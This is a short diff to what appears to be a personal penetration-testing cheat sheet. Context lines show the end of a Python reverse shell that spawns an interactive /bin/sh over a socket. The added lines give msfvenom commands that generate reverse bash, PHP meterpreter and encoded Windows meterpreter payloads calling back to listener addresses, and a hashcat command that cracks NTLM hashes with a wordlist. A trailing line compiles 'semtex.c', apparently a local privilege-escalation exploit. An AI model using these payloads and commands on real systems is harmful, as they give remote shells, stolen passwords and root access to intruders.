@@ -10,6 +10,15 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)  
 p=subprocess.call(["/bin/sh","-i"])  
 
+## msfvenom payloads I've used
+msfvenom -p cmd/unix/reverse_bash lhost=172.16.3.1 lport=4123 R > shell.sh  
+msfvenom -p php/meterpreter_reverse_tcp LHOST=172.16.3.1 LPORT=4123 -f raw > shell.php  
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.3.3 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest  
+
+## hashcat
+store cracks in a different potfile:  
+hashcat --potfile-path hashcat.pot -m 1000 -a 0 hashes.txt ~/wordlists/rockyou.txt  
+
 ## old centos
 bash-4.1$ /usr/bin/gcc -O2 semtex.c -o semtex  
 /usr/bin/gcc -O2 semtex.c -o semtex  
